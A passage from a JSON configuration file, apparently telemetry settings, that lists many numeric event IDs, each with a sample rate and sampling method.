								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270205944": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206029": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206071": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206085": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206168": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206179": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206214": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206215": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206216": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206224": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206230": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206253": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206259": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206315": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206350": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206388": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206588": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206671": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206696": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206744": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206832": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206843": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270206870": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207098": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207136": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207148": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207296": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207393": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207420": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207600": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207618": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207765": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207797": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207843": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207912": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270207953": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208007": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208148": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208178": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208265": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208269": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208286": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208333": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208406": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208527": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208593": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208656": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208708": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208826": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208920": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270208970": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209003": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209052": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209091": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209102": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209148": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209262": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209274": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209329": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209402": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209445": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209519": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209660": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209661": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209760": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209775": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209815": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209843": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209902": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270209991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210163": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210164": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210188": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210235": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210265": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210288": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210332": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210419": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210471": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210475": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210517": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210707": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210724": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210806": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210841": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210869": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270210979": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211090": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211138": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211171": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211202": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211218": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211281": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211332": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211335": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211347": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211379": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211419": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211435": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211506": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211636": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211692": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211722": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211726": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211728": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211753": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211772": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211803": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211869": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270211949": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212138": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212216": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212219": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212238": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212273": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212277": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212441": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212554": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212656": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212696": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212843": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212857": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212893": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270212956": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213015": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213108": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213135": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213161": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213183": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213250": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213359": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213374": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213486": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213512": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213538": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213707": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213723": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213749": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270213786": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214027": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214035": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214052": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214104": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214189": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214320": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214400": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214409": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214459": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214580": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214602": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214612": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214705": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214707": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214719": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214731": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214784": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214832": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214973": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270214989": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215065": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215070": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215101": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215116": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215140": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215224": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215230": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215347": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215397": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215429": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215542": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215574": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215690": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215709": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215742": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215772": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215778": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215792": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215819": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270215979": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216000": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216093": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216200": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216416": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216423": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216430": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216450": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216713": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216791": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216793": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216818": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216896": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216928": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270216941": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217026": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217057": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217063": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217068": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217210": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217236": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217256": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217283": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217313": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217327": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217401": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217492": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217539": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217616": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217631": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217722": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217749": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217779": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217787": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217798": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217800": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217820": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217862": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217878": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217900": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270217954": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218007": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218053": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218090": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218102": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218152": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218163": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218166": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218168": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218204": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218207": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218271": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218310": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218326": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218338": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218436": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218543": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218572": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218586": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218605": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218622": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218660": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218696": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218731": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270218991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219017": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219019": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219051": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219169": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219188": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219248": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219249": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219291": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219303": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219320": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219404": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219449": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219483": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219531": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219562": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219686": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219870": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219914": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270219926": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220001": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220072": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220074": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220108": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220129": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220209": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220261": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220262": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220333": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220347": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220481": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220499": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220550": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220595": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220640": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220731": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220850": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220865": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220879": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220889": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270220997": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221024": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221065": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221124": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221133": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221175": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270221177": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270224526": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270228232": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270230590": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270230822": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270232559": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"270233440": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"273481729": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295437333": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295437392": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295437585": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295437809": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295437849": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295438195": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295438980": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295439218": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295439505": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295439522": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295439982": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295440238": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295440518": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295440638": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295441099": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295441104": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295441165": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295441218": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295441453": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295442359": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295442443": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295442568": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295442707": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295443394": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295443659": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295444052": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295444127": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295444428": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295444872": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295444992": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295445259": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295445408": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295445507": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295446230": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295447305": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295447411": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295447532": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295447763": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295448628": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295448870": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295448939": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295449023": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295449229": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295449938": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295450853": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295450962": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295451974": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295451977": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295452084": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295452498": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"295576223": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"298516481": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"300429672": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"303370010": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"303374119": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"314255059": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"314255718": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"314255820": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"314256622": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"315555841": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"316547721": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"316804045": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316804194": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316805991": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316806070": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316806359": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316806850": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316812351": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316812736": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316814957": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"316816299": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"318701569": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"318707653": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"318710863": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"318716922": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"320809182": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"333185025": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"333185026": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"336201917": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"336205322": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"336207527": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"336212887": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"336213902": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"336215495": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"339818860": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"341835777": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"341847353": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"341848280": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"348132017": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351152344": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"351539711": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351540102": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351540413": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351540800": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351541595": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351542287": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351543111": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351543947": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351544664": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351546651": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351548391": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"351548854": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"368647392": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"373295708": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"373298325": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"373308219": {
								"sampleRate": 1000,
								"samplingMethod": 1
							},
							"374672177": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"374678380": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377357808": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377358784": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377359040": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377359367": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377359743": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377360139": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377360510": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377361415": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377362087": {
								"sampleRate": 5,
								"samplingMethod": 1
							},
							"377362266": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377363484": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377364678": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377364955": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377364984": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"377367558": {
